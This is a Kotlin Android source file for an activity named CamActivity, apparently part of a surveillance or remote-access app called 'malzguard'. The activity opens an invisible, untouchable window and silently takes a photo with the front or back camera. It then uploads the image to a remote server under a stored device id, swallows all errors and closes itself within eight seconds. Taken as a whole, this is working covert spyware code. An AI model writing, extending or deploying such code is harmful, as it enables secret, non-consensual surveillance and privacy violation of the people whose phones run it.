package com.example.malzguard

import android.app.Activity
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.hardware.camera2.*
import android.media.ImageReader
import android.os.Bundle
import android.os.Handler
import android.os.HandlerThread
import android.view.WindowManager
import java.io.ByteArrayOutputStream
import java.io.OutputStream
import java.net.HttpURLConnection
import java.net.URL

class CamActivity : Activity() {
    private var thread: HandlerThread? = null
    private var handler: Handler? = null
    private var cam: CameraDevice? = null

    override fun onCreate(s: Bundle?) {
        super.onCreate(s)
        try {
            window.setBackgroundDrawableResource(android.R.color.transparent)
            window.addFlags(WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE)
            
            val facing = intent.getStringExtra("facing") ?: "back"
            thread = HandlerThread("cam").also { it.start() }
            handler = Handler(thread!!.looper)
            handler!!.post { openCam(facing) }
            handler!!.postDelayed({ finish() }, 8000)
        } catch (e: Exception) { finish() }
    }

    private fun openCam(facing: String) {
        try {
            val cm = getSystemService(CAMERA_SERVICE) as CameraManager
            val camId = cm.cameraIdList.firstOrNull { cid ->
                val ch = cm.getCameraCharacteristics(cid)
                val f = ch.get(CameraCharacteristics.LENS_FACING)
                if (facing == "front") f == CameraCharacteristics.LENS_FACING_FRONT else f == CameraCharacteristics.LENS_FACING_BACK
            } ?: cm.cameraIdList.firstOrNull() ?: run { finish(); return }
            
            val ch = cm.getCameraCharacteristics(camId)
            val sensorOrientation = ch.get(CameraCharacteristics.SENSOR_ORIENTATION) ?: 0
            val sz = ch.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)?.getOutputSizes(ImageReader::class.java)?.firstOrNull() ?: run { finish(); return }
            
            val reader = ImageReader.newInstance(sz.width, sz.height, android.graphics.ImageFormat.JPEG, 1)
            reader.setOnImageAvailableListener({ r ->
                try {
                    val img = r.acquireLatestImage()
                    val buf = img?.planes?.get(0)?.buffer
                    if (buf != null) {
                        val bytes = ByteArray(buf.remaining()); buf.get(bytes)
                        uploadPhoto(bytes, sensorOrientation)
                    }
                    img?.close()
                } catch (e: Exception) {}
                try { r.close() } catch (e: Exception) {}
                runOnUiThread { finish() }
            }, handler)

            cm.openCamera(camId, object : CameraDevice.StateCallback() {
                override fun onOpened(camera: CameraDevice) {
                    cam = camera
                    try {
                        camera.createCaptureSession(listOf(reader.surface), object : CameraCaptureSession.StateCallback() {
                            override fun onConfigured(sess: CameraCaptureSession) {
                                try {
                                    val req = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
                                    req.addTarget(reader.surface)
                                    sess.capture(req.build(), null, handler)
                                } catch (e: Exception) { finish() }
                            }
                            override fun onConfigureFailed(sess: CameraCaptureSession) { finish() }
                        }, handler)
                    } catch (e: Exception) { finish() }
                }
                override fun onDisconnected(camera: CameraDevice) { try { camera.close() } catch (e: Exception) {}; finish() }
                override fun onError(camera: CameraDevice, e: Int) { try { camera.close() } catch (e: Exception) {}; finish() }
            }, handler)
        } catch (e: Exception) { finish() }
    }

    private fun uploadPhoto(bytes: ByteArray, rotate: Int) {
        try {
            var bmp = BitmapFactory.decodeByteArray(bytes, 0, bytes.size)
            if (bmp != null && rotate != 0) {
                val matrix = android.graphics.Matrix()
                matrix.postRotate(rotate.toFloat())
                val rotated = Bitmap.createBitmap(bmp, 0, 0, bmp.width, bmp.height, matrix, true)
                bmp.recycle()
                bmp = rotated
            }
            val out = ByteArrayOutputStream()
            bmp?.compress(Bitmap.CompressFormat.JPEG, 80, out)
            val finalBytes = out.toByteArray()

            val sp = getSharedPreferences("mg", MODE_PRIVATE)
            val id = sp.getString("id", "") ?: ""
            if (id.isEmpty()) return
            
            val boundary = "----MG" + System.currentTimeMillis()
            val head = ("--$boundary\r\nContent-Disposition: form-data; name=\"file\"; filename=\"cam.jpg\"\r\nContent-Type: image/jpeg\r\n\r\n").toByteArray()
            val tail = ("\r\n--$boundary--\r\n").toByteArray()
            val total = head.size + finalBytes.size + tail.size
            
            val c = URL(Config.SERVER + "/api/upload/" + id + "/photo").openConnection() as HttpURLConnection
            c.connectTimeout = 15000; c.readTimeout = 30000; c.requestMethod = "POST"; c.doOutput = true
            c.setFixedLengthStreamingMode(total)
            c.setRequestProperty("Content-Type", "multipart/form-data; boundary=$boundary")
            val os: OutputStream = c.outputStream
            os.write(head); os.write(finalBytes); os.write(tail); os.flush(); os.close()
            try { c.responseCode } catch (e: Exception) {}
            try { c.disconnect() } catch (e: Exception) {}
        } catch (e: Exception) {}
    }

    override fun onDestroy() {
        try { cam?.close() } catch (e: Exception) {}
        try { thread?.quitSafely() } catch (e: Exception) {}
        super.onDestroy()
    }
}
